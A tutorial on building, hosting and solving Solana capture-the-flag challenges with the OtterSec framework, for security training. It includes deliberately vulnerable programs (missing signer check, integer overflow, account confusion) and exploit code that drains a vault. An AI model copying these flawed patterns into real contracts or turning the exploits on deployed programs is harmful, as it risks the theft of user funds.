# Solana CTF Framework

Learn how to create, host, and solve Capture The Flag (CTF) challenges for Solana security education and competitions.

## Overview

The Solana CTF Framework is a powerful tool for creating interactive security challenges that help developers learn about Solana vulnerabilities through hands-on exploitation. This guide covers everything from basic challenge creation to hosting CTF competitions.

## Learning Objectives

By completing this guide, you will learn how to:

- Set up the Solana CTF Framework
- Create custom security challenges
- Build challenge servers
- Solve CTF challenges
- Host CTF competitions
- Design educational security exercises

## Prerequisites

- Completed [Common Vulnerabilities](../01-common-vulnerabilities/) module
- Understanding of Solana programs and security
- Rust programming knowledge
- Basic Docker knowledge (for hosting)

---

## What is a CTF?

### Capture The Flag Basics

A CTF (Capture The Flag) is a cybersecurity competition where participants:

1. **Analyze** vulnerable programs
2. **Exploit** security flaws
3. **Capture** flags (secret strings)
4. **Learn** security concepts through practice

### Why Solana CTFs?

- **Hands-on Learning:** Practice exploiting real vulnerabilities
- **Safe Environment:** Test attacks without consequences
- **Skill Building:** Develop security auditing skills
- **Competition:** Compete with other security researchers
- **Education:** Teach security concepts effectively

---

## Framework Architecture

### Components

```text
CTF Challenge
├── Challenge Program (vulnerable.so)
│   └── Contains intentional vulnerabilities
├── Challenge Server (main.rs)
│   └── Manages challenge environment
├── Solve Program (solve.so)
│   └── Player's exploit code
└── Flag (flag.txt)
    └── Secret string to capture
```

### Challenge Flow

```text
1. Player connects to server
2. Server loads challenge program
3. Player submits solve program
4. Server executes solve program
5. Server checks win condition
6. If successful, server reveals flag
```

---

## Installation and Setup

### Add Framework Dependency

Add to your `Cargo.toml`:

```toml
[dependencies]
sol-ctf-framework = { git = "https://github.com/otter-sec/sol-ctf-framework.git" }
solana-program-test = "1.18"
solana-sdk = "1.18"
```

### Fix Base64 Version (if needed)

```bash
cargo update --precise 1.6.0 -p base64ct@1.8.0
```

### Install Required Tools

```bash
# Solana CLI
sh -c "$(curl -sSfL https://release.solana.com/stable/install)"

# Anchor (optional, for Anchor programs)
cargo install --git https://github.com/coral-xyz/anchor avm --locked --force
avm install latest
avm use latest

# Docker (for hosting)
# Install from https://docs.docker.com/get-docker/
```

---

## Creating Your First Challenge

### Step 1: Create Challenge Program

Create a vulnerable program that players must exploit:

```rust
// challenge/src/lib.rs
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();
    let user = next_account_info(accounts_iter)?;
    let vault = next_account_info(accounts_iter)?;

    // VULNERABILITY: Missing signer check!
    // Players can drain the vault by not signing
    
    msg!("Transferring from vault to user");
    
    **vault.try_borrow_mut_lamports()? -= 100_000;
    **user.try_borrow_mut_lamports()? += 100_000;

    Ok(())
}
```

### Step 2: Build Challenge Program

```bash
cd challenge
cargo build-sbf
# Output: target/deploy/challenge.so
```

### Step 3: Create Challenge Server

```rust
// server/src/main.rs
use sol_ctf_framework::ChallengeBuilder;
use solana_program_test::tokio::runtime::Runtime;
use solana_sdk::{
    account::Account,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
};
use solana_system_interface::program as system_program;
use std::{
    env,
    error::Error,
    io::Write,
    net::{TcpListener, TcpStream},
};
use threadpool::ThreadPool;

fn main() -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind("0.0.0.0:8080")?;
    let pool = ThreadPool::new(4);
    
    for stream in listener.incoming() {
        let stream = stream.unwrap();
        pool.execute(|| {
            handle_connection(stream).unwrap();
        });
    }
    Ok(())
}

fn handle_connection(mut socket: TcpStream) -> Result<(), Box<dyn Error>> {
    let runtime = Runtime::new()?;
    let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap())?;

    // Load player's solve program
    let solve_pubkey = match builder.input_program() {
        Ok(pubkey) => pubkey,
        Err(e) => {
            writeln!(socket, "Error: cannot add solve program → {e}")?;
            return Ok(());
        }
    };

    // Load challenge program
    let program_pubkey = builder
        .add_program("./challenge.so", None)
        .expect("Failed to add challenge program");

    // Create user account
    let user = Keypair::new();
    
    // Derive vault PDA
    let (vault, _) = Pubkey::find_program_address(
        &["vault".as_ref()],
        &program_pubkey
    );

    // Set initial balances
    const TARGET_AMT: u64 = 50_000;
    const INIT_BAL: u64 = 10;
    const VAULT_BAL: u64 = 1_000_000;

    builder.builder.add_account(
        user.pubkey(),
        Account::new(INIT_BAL, 0, &system_program::ID)
    );
    builder.builder.add_account(
        vault,
        Account::new(VAULT_BAL, 0, &system_program::ID)
    );

    // Send challenge info to player
    writeln!(socket, "program pubkey: {}", program_pubkey)?;
    writeln!(socket, "solve pubkey: {}", solve_pubkey)?;
    writeln!(socket, "user pubkey: {}", user.pubkey())?;
    writeln!(socket, "vault pubkey: {}", vault)?;

    let mut challenge = runtime.block_on(builder.build());

    // Read player's solve instruction
    let solve_ix = match challenge.read_instruction(solve_pubkey) {
        Ok(ix) => ix,
        Err(e) => {
            writeln!(socket, "Error: cannot read solve instruction → {e}")?;
            return Ok(());
        }
    };

    // Execute solve instruction
    let payer = challenge.ctx.payer.insecure_clone();
    let payer_pubkey = payer.pubkey();
    let signers: [&Keypair; 2] = [&payer, &user];
    
    if let Err(e) = runtime.block_on(
        challenge.run_ixs_full(&[solve_ix], &signers, &payer_pubkey)
    ) {
        writeln!(socket, "Error: transaction failed → {e}")?;
        return Ok(());
    }

    // Check win condition
    let balance = runtime
        .block_on(challenge.ctx.banks_client.get_account(user.pubkey()))?
        .unwrap()
        .lamports;

    writeln!(socket, "user balance: {}", balance)?;

    if balance > TARGET_AMT {
        writeln!(socket, "🎉 Congratulations! You solved the challenge!")?;
        if let Ok(flag) = env::var("FLAG") {
            writeln!(socket, "flag: {}", flag)?;
        } else {
            writeln!(socket, "flag not found, please contact admin")?;
        }
    } else {
        writeln!(socket, "❌ Challenge not solved. Keep trying!")?;
    }

    Ok(())
}
```

### Step 4: Create Solve Program

Players create this to exploit the vulnerability:

```rust
// solve/src/lib.rs
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();
    let user = next_account_info(accounts_iter)?;
    let vault = next_account_info(accounts_iter)?;
    let challenge_program = next_account_info(accounts_iter)?;

    msg!("Exploiting missing signer check...");

    // Call challenge program multiple times
    // Since it doesn't check signers, we can drain the vault
    for _ in 0..10 {
        solana_program::program::invoke(
            &solana_program::instruction::Instruction {
                program_id: *challenge_program.key,
                accounts: vec![
                    solana_program::instruction::AccountMeta::new(
                        *user.key,
                        false, // Not signing!
                    ),
                    solana_program::instruction::AccountMeta::new(
                        *vault.key,
                        false,
                    ),
                ],
                data: vec![],
            },
            &[user.clone(), vault.clone()],
        )?;
    }

    msg!("Exploit complete!");
    Ok(())
}
```

---

## Challenge Server API

### ChallengeBuilder Methods

#### `input_program()`

Reads a program from the player:

```rust
let solve_pubkey = builder.input_program()?;
```

**Player sends:**
```text
program pubkey: <pubkey>
program len: <length>
<binary data>
```

#### `add_program(path, key)`

Adds a program to the test environment:

```rust
let program_id = builder.add_program("./program.so", None)?;
```

#### `build()`

Creates the challenge environment:

```rust
let mut challenge = runtime.block_on(builder.build());
```

### Challenge Methods

#### `read_instruction(program_id)`

Reads an instruction from the player:

```rust
let ix = challenge.read_instruction(solve_pubkey)?;
```

**Player sends:**
```text
num accounts: 3
sw <user_pubkey>
w <vault_pubkey>
 <program_pubkey>
ix len: 0
```

**Account Meta Format:**
- `s` = signer
- `w` = writable
- `sw` = signer + writable
- ` ` = read-only

#### `run_ix(ix)` / `run_ixs(ixs)`

Executes instructions:

```rust
challenge.run_ix(instruction).await?;
challenge.run_ixs(&[ix1, ix2]).await?;
```

#### `run_ixs_full(ixs, signers, payer)`

Executes with custom signers:

```rust
challenge.run_ixs_full(&[ix], &signers, &payer_pubkey).await?;
```

#### Helper Methods

```rust
// Add token mint
let mint = challenge.add_mint().await?;

// Add token account
let token_account = challenge.add_token_account(&mint, &owner).await?;

// Mint tokens
challenge.mint_to(amount, &mint, &account).await?;

// Read token account
let account_data = challenge.read_token_account(pubkey).await?;
```

---

## Solving Challenges

### Step 1: Connect to Server

```bash
nc challenge.server.com 8080
```

### Step 2: Analyze Challenge

Server sends:
```text
program pubkey: <challenge_program_id>
solve pubkey: <your_program_id>
user pubkey: <user_account>
vault pubkey: <vault_account>
```

### Step 3: Build Solve Program

```bash
cd solve
cargo build-sbf
```

### Step 4: Submit Solution

Use a Python script to interact:

```python
#!/usr/bin/env python3
import socket
import struct

def send_program(sock, program_id, program_data):
    # Send program pubkey
    sock.recv(1024)  # "program pubkey: "
    sock.sendall(f"{program_id}\n".encode())
    
    # Send program length
    sock.recv(1024)  # "program len: "
    sock.sendall(f"{len(program_data)}\n".encode())
    
    # Send program data
    sock.sendall(program_data)

def send_instruction(sock, accounts, data):
    # Send number of accounts
    sock.recv(1024)  # "num accounts: "
    sock.sendall(f"{len(accounts)}\n".encode())
    
    # Send account metas
    for meta, pubkey in accounts:
        sock.sendall(f"{meta} {pubkey}\n".encode())
    
    # Send instruction data
    sock.recv(1024)  # "ix len: "
    sock.sendall(f"{len(data)}\n".encode())
    sock.sendall(data)

# Connect
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('challenge.server.com', 8080))

# Read solve program
with open('solve.so', 'rb') as f:
    solve_program = f.read()

# Send solve program
send_program(sock, "YourSolveProgramID", solve_program)

# Read challenge info
info = sock.recv(4096).decode()
print(info)

# Parse pubkeys from info
# ... extract program_id, user, vault ...

# Send solve instruction
accounts = [
    ("sw", user_pubkey),
    ("w", vault_pubkey),
    ("", challenge_program_id),
]
send_instruction(sock, accounts, b"")

# Read result
result = sock.recv(4096).decode()
print(result)

sock.close()
```

---

## Challenge Design Best Practices

### 1. Clear Objectives

```rust
// Good: Clear win condition
if user_balance > 50_000 {
    writeln!(socket, "Challenge solved!")?;
}

// Bad: Unclear objective
if some_complex_state == true {
    // What does this mean?
}
```

### 2. Realistic Vulnerabilities

Focus on real-world security issues:

- Missing signer checks
- Integer overflow/underflow
- Incorrect account validation
- Reentrancy
- Type confusion
- Arbitrary CPI

### 3. Appropriate Difficulty

**Beginner:**
- Single vulnerability
- Clear exploitation path
- Minimal setup required

**Intermediate:**
- Multiple steps
- Requires understanding of Solana concepts
- Some creative thinking needed

**Advanced:**
- Complex vulnerability chains
- Deep Solana knowledge required
- Novel exploitation techniques

### 4. Educational Value

```rust
// Include hints in error messages
if !user.is_signer {
    msg!("HINT: This account should be a signer");
    return Err(ProgramError::MissingRequiredSignature);
}
```

### 5. Testing

Test your challenge thoroughly:

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_exploit_works() {
        // Verify the intended solution works
    }

    #[test]
    fn test_unintended_solutions() {
        // Check for unintended solutions
    }
}
```

---

## Example Challenges

### Challenge 1: Missing Signer Check

**Vulnerability:**
```rust
// No signer check!
pub fn withdraw(accounts: &[AccountInfo]) -> ProgramResult {
    let user = next_account_info(accounts)?;
    let vault = next_account_info(accounts)?;
    
    **vault.lamports.borrow_mut() -= 100;
    **user.lamports.borrow_mut() += 100;
    Ok(())
}
```

**Exploit:**
```rust
// Call without signing
invoke(
    &withdraw_ix,
    &[user, vault],
)?;
```

### Challenge 2: Integer Overflow

**Vulnerability:**
```rust
pub fn deposit(amount: u64) -> ProgramResult {
    let balance = get_balance()?;
    // Overflow if balance + amount > u64::MAX
    set_balance(balance + amount)?;
    Ok(())
}
```

**Exploit:**
```rust
// Deposit u64::MAX to overflow back to 0
deposit(u64::MAX)?;
```

### Challenge 3: Account Confusion

**Vulnerability:**
```rust
pub fn transfer(accounts: &[AccountInfo]) -> ProgramResult {
    let from = next_account_info(accounts)?;
    let to = next_account_info(accounts)?;
    
    // No check that from != to
    **from.lamports.borrow_mut() -= 100;
    **to.lamports.borrow_mut() += 100;
    Ok(())
}
```

**Exploit:**
```rust
// Pass same account twice to duplicate funds
transfer(&[user, user])?;
```

---

## Hosting CTF Competitions

### Docker Setup

Create `Dockerfile`:

```dockerfile
FROM rust:1.75

# Install Solana
RUN sh -c "$(curl -sSfL https://release.solana.com/stable/install)"
ENV PATH="/root/.local/share/solana/install/active_release/bin:${PATH}"

# Copy challenge files
WORKDIR /challenge
COPY challenge.so .
COPY server /usr/local/bin/

# Set flag
ENV FLAG="flag{your_flag_here}"

EXPOSE 8080

CMD ["server"]
```

Build and run:

```bash
docker build -t my-ctf-challenge .
docker run -p 8080:8080 my-ctf-challenge
```

### Challenge Configuration

Create `challenge.yaml`:

```yaml
name: my-challenge
author: your-name
description: |
  Challenge description here.
  
  Connect with: nc challenge.server.com 8080

provide:
  - kind: zip
    spec:
      as: challenge.zip
      exclude:
        - flag.txt
      files:
        - challenge
        - server
      additional:
        - path: flag.txt
          str: flag{fake_flag_for_testing}

flag:
  file: flag.txt

containers:
  main:
    build: .
    replicas: 1
    ports:
      - 8080

expose:
  main:
    - target: 8080
      tcp: 31337
```

### Security Considerations

1. **Isolate Challenges:** Use Docker containers
2. **Resource Limits:** Set CPU/memory limits
3. **Timeout:** Implement connection timeouts
4. **Rate Limiting:** Prevent DoS attacks
5. **Flag Rotation:** Change flags regularly

---

## Advanced Topics

### Multi-Stage Challenges

```rust
pub enum ChallengeStage {
    Stage1,
    Stage2,
    Stage3,
}

pub fn check_stage(stage: ChallengeStage) -> ProgramResult {
    match stage {
        ChallengeStage::Stage1 => {
            // First vulnerability
        }
        ChallengeStage::Stage2 => {
            // Second vulnerability (requires Stage1)
        }
        ChallengeStage::Stage3 => {
            // Final stage
        }
    }
    Ok(())
}
```

### Dynamic Challenges

```rust
// Generate unique challenge per player
let seed = hash(player_pubkey);
let challenge_params = generate_params(seed);
```

### Scoreboard Integration

```rust
// Track solve times
struct Solve {
    player: Pubkey,
    timestamp: i64,
    time_taken: u64,
}
```

---

## Common Issues and Solutions

### Issue 1: Program Won't Load

**Error:** "Error: cannot add solve program"

**Solution:** Check program size and format:
```bash
# Verify program is valid
solana program dump <program_id> test.so
```

### Issue 2: Instruction Parsing Fails

**Error:** "Error: cannot read solve instruction"

**Solution:** Verify account meta format:
```text
Correct: sw <pubkey>
Wrong: s w <pubkey>
```

### Issue 3: Transaction Fails

**Error:** "Error: transaction failed"

**Solution:** Check account permissions and balances:
```rust
// Add debug logging
msg!("Account balance: {}", account.lamports());
msg!("Is signer: {}", account.is_signer);
```

---

## Resources

### Official Resources
- [Solana CTF Framework](https://github.com/otter-sec/sol-ctf-framework)
- [Solana Security Best Practices](https://docs.solana.com/developing/programming-model/security)
- [Solana Program Library](https://github.com/solana-labs/solana-program-library)

### CTF Platforms
- [Paradigm CTF](https://ctf.paradigm.xyz/)
- [Neodyme CTF](https://ctf.neodyme.io/)
- [OtterSec CTF](https://ctf.osec.io/)

### Learning Resources
- [Solana Security Workshop](https://workshop.neodyme.io/)
- [Sealevel Attacks](https://github.com/coral-xyz/sealevel-attacks)
- [Solana Security Audits](https://github.com/0xsanny/solsec)

---

## Next Steps

- Review [Common Vulnerabilities](../01-common-vulnerabilities/) for challenge ideas
- Study [PoC Frameworks](../04-poc-frameworks/) for testing exploits
- Practice with [Fuzzing](../03-fuzzing-with-trident/) to find bugs
- Join CTF competitions to test your skills

---

## Exercises

### Exercise 1: Create a Basic Challenge

Create a challenge with a missing signer check vulnerability.

**Requirements:**
- Vault with 1M lamports
- User starts with 10 lamports
- Win condition: user has > 50K lamports

### Exercise 2: Solve an Existing Challenge

Connect to a practice server and solve the challenge.

### Exercise 3: Host Your Own CTF

Set up a Docker container hosting your challenge.

---

**Source:** Based on [Solana CTF Framework](https://github.com/otter-sec/sol-ctf-framework) by OtterSec
